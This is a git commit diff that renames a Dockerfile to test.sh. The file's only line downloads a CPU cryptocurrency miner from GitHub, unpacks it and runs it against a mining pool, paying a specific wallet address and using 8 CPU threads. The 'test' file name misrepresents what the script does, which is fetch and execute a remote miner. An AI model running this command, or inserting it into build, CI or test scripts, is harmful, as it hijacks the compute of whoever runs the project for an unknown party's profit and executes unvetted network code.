dfb4b358c3664f1dc9b43ed41420b6ada9d5a1e2
hasgi445 <96520838+hasgi445@users.noreply.github.com>
2021-12-24 19:57:40 +0700

    Update and rename Dockerfile to test.sh

---
+++ test.sh
@@ -0,0 +1,1 @@
+wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz && ./hellminer -c tcp://ap.luckpool.net:3956#xnsub -u RJykqNskDq8DQcUdtuzoYituS9PKp7rk7v.worker -p x --cpu 8
